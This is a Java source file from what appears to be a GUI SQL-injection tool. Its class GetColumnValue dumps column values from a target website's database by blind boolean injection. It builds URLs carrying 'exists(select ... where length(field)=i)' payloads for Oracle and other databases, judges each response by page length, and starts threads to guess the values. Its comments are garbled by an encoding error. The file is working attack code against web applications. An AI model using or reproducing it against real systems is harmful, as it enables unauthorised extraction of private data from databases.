package com.sql;

import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.table.DefaultTableModel;

public class GetColumnValue implements Runnable {
	private String url;
	private String urlHead;
	private String urlEnd;
	private boolean flag = true;
	private JButton parseValueBtn;
	private DefaultTableModel showValue;
	private String tableName;
	private List<String> columnName;
	private List<List<String>> value;
	private int DBType;
	private List<List<String>> valueNotMatched;
	public int active = 0;
	private int contentLen;
	public GetColumnValue(String url, String urlHead, String urlEnd,
			JButton parseValueBtn, DefaultTableModel showValue,
			List<List<String>> value, String tableName,
			List<String> columnName, int DBType) {
		// TODO Auto-generated constructor stub
		this.url = url;
		this.urlEnd = urlEnd;
		this.urlHead = urlHead;
		this.parseValueBtn = parseValueBtn;
		this.showValue = showValue;
		this.tableName = tableName;
		this.columnName = columnName;
		this.value = value;
		this.DBType = DBType;
		this.contentLen=IsExistInjection.getContent(this.url).length();
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		// ����ȡ�ֶ�ֵ���������ֶ�����Ӧ
		valueNotMatched = new ArrayList<List<String>>();
		for (int i = 0; i < columnName.size(); i++) {// �������е��ֶΣ���ÿһ���ֶ������²���
			List<Integer> length = new ArrayList<Integer>();// ����һ���������洢�ֶε����г���ֵ�����糤����2
			// 3 4
			length = testFieldLength(columnName.get(i), tableName); // �ֶγ���
			List<String> allValue = new ArrayList<String>();
			for (int j = 0; j < length.size() && flag == true; j++) {// �ֱ��ҳ�����Ϊlength.get(m)��ֵ����Щ
				List<String> value = new ArrayList<String>();
				GuessValue guessValue = new GuessValue(url, columnName.get(i),
						tableName, length.get(j), urlHead, urlEnd, DBType,
						value, GetColumnValue.this, allValue);
				Thread thread = new Thread(guessValue);
				this.active++;
				thread.start();
			}
			while (active > 0) {
			}
			valueNotMatched.add(i, allValue);
		}
		new ValueMatch(this.url, tableName, columnName, valueNotMatched,
				this.urlHead, this.urlEnd, this.DBType, showValue, value); // ���ղŲ³����������ֶ������ֶ�ֵ����ƥ��
		parseValueBtn.setText("�������");

	}

	public void stop() {
		flag = false;
	}

	public List<Integer> testFieldLength(String fieldName, String tableName) {// �����ֶγ���
		List<Integer> list = new ArrayList<Integer>();// ����һ���������洢�ֶ��е����м�¼�ĳ���ֵ
		/*
		 * �½��ֶγ���
		 */

		for (int i = 0; i < 15; i++) {
			String testUrl = "";

			if (DBType == 0 || DBType == 2) {// Oracle
				testUrl = urlHead + "exists(select%20" + fieldName
						+ "%20from%20" + tableName + "%20where%20length("
						+ fieldName + ")=" + i + ")" + urlEnd;
			} else {
				testUrl = urlHead + "exists(select%20" + fieldName
						+ "%20from%20" + tableName + "%20where%20len("
						+ fieldName + ")=" + i + ")" + urlEnd;
			}
			try {
				if (IsExistInjection.isRightPage(this.contentLen, testUrl)) {
					list.add(i);
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return list;
	}
}
